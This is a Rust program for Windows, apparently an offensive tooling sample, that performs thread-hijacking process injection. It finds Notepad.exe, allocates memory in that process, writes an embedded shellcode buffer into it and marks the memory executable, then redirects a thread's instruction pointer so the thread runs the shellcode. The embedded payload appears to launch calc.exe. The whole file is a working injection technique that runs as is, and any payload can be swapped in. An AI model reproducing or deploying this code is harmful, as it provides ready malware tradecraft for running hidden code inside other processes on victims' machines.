use std::{ffi::CStr, process, ptr::null_mut};

use winapi::{
    ctypes::c_void,
    um::{
        errhandlingapi::GetLastError,
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
        memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory},
        processthreadsapi::{GetThreadContext, OpenProcess, OpenThread, ResumeThread, SetThreadContext},
        synchapi::WaitForSingleObject,
        tlhelp32::{
            CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next,
            TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
        },
        winnt::{
            CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
            THREAD_ALL_ACCESS,
        },
    },
};

const PROCESS_NAME: &str = "Notepad.exe";

const BUF: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

fn get_process_id(process_name: &str, process_handle: &mut *mut c_void) -> u32 {
    unsafe {
        let snapshot_handle: *mut c_void;
        let mut process_entry: PROCESSENTRY32 = std::mem::zeroed();

        process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot_handle == INVALID_HANDLE_VALUE {
            println!(
                "[-] CreateToolhelp32Snapshot failed with error: {}",
                GetLastError()
            );
            return 0;
        }

        if Process32First(snapshot_handle, &mut process_entry) == 0 {
            println!("[-] Process32First failed with error: {}", GetLastError());
            CloseHandle(snapshot_handle);
            return 0;
        }

        loop {
            let procname = CStr::from_ptr(process_entry.szExeFile.as_ptr())
                .to_str()
                .unwrap();
            if procname.to_lowercase() == process_name.to_lowercase() {
                CloseHandle(snapshot_handle);
                if OpenProcess(THREAD_ALL_ACCESS, 0, process_entry.th32ProcessID) != null_mut() {
                    *process_handle = OpenProcess(THREAD_ALL_ACCESS, 0, process_entry.th32ProcessID);
                } else {
                    println!("[-] OpenProcess failed with error: {}", GetLastError());
                    return 0;
                };
                return process_entry.th32ProcessID;
            }

            if Process32Next(snapshot_handle, &mut process_entry) == 0 {
                break;
            }
        }

        CloseHandle(snapshot_handle);
        println!("[-] Process {} not found.", process_name);
        return 0;
    }
}

fn get_thread_handle(
    process_id: u32,
    thread_id: &mut u32,
    thread_handle: &mut *mut c_void,
) -> bool {
    unsafe {
        let snapshot_handle: *mut c_void;
        let mut thread_entry: THREADENTRY32 = std::mem::zeroed();

        thread_entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, process_id);

        if snapshot_handle == INVALID_HANDLE_VALUE {
            println!(
                "[-] CreateToolhelp32Snapshot failed with error: {}",
                GetLastError()
            );
            return false;
        }

        if Thread32First(snapshot_handle, &mut thread_entry) == 0 {
            println!("[-] Thread32First failed with error: {}", GetLastError());
            CloseHandle(snapshot_handle);
            return false;
        }

        loop {
            if thread_entry.th32OwnerProcessID == process_id {
                *thread_id = thread_entry.th32ThreadID;
                *thread_handle = OpenThread(THREAD_ALL_ACCESS, 0, *thread_id);

                if (*thread_handle).is_null() {
                    println!("[-] OpenThread failed with error: {}", GetLastError());
                    CloseHandle(snapshot_handle);
                    return false;
                }

                CloseHandle(snapshot_handle);
                return true;
            }

            if Thread32Next(snapshot_handle, &mut thread_entry) == 0 {
                break;
            }
        }

        CloseHandle(snapshot_handle);
    }

    return false;
}

fn inject_shellcode(
    process_handle: *mut c_void,
    shellcode: &[u8],
    shellcode_size: usize,
) -> *mut c_void {
    unsafe {

        let paddress = VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if paddress.is_null() {
            println!("[-] VirtualAllocEx failed with error: {}", GetLastError());
            return std::ptr::null_mut();
        }

        let mut bytes_written: usize = 0;

        if WriteProcessMemory(
            process_handle,
            paddress,
            shellcode.as_ptr() as *const c_void,
            shellcode_size,
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed with error: {}",
                GetLastError()
            );
            return std::ptr::null_mut();
        }

        let mut old_protect: u32 = 0;

        if VirtualProtectEx(
            process_handle,
            paddress,
            shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            println!("[-] VirtualProtectEx failed with error: {}", GetLastError());
            return std::ptr::null_mut();
        }

        if paddress.is_null() {
            println!("[-] Shellcode injection failed.");
            return std::ptr::null_mut();
        } else {
            return paddress;
        }
    }

}

fn hijack_thread(thread_handle: *mut c_void, paddress: *const c_void) -> bool {
    unsafe {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL;

        if GetThreadContext(thread_handle, &mut ctx) == 0 {
            println!("[-] GetThreadContext failed with error: {}", GetLastError());
            return false;
        }

        ctx.Rip = paddress as u64;

        if SetThreadContext(thread_handle, &ctx) == 0 {
            println!("[-] SetThreadContext failed with error: {}", GetLastError());
            return false;
        }

        ResumeThread(thread_handle);

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }

    return true;
}

fn main() {
    let mut process_handle: *mut c_void = null_mut();
    let process_id = get_process_id(PROCESS_NAME, &mut process_handle);
    println!("[+] Process ID of {}: {}", PROCESS_NAME, process_id);
    let mut thread_id: u32 = 0;
    let mut thread_handle: *mut c_void = std::ptr::null_mut();

    if get_thread_handle(process_id, &mut thread_id, &mut thread_handle) {
        println!(
            "[+] Thread handle obtained successfully: {:?}",
            thread_handle
        );
    } else {
        println!("[-] Failed to obtain thread handle.");
process::exit(1);
    }

    let paddress = inject_shellcode(process_handle, &BUF, BUF.len());

    if paddress.is_null() {
        println!("[-] Failed to inject shellcode.");
        process::exit(1);
    } else {
        println!("[+] Shellcode injected at address: {:?}", paddress);
    }

    if hijack_thread(thread_handle, paddress) {
        println!("[+] Thread hijacked successfully.");
    } else {
        println!("[-] Failed to hijack thread.");
        process::exit(1);
    }

}
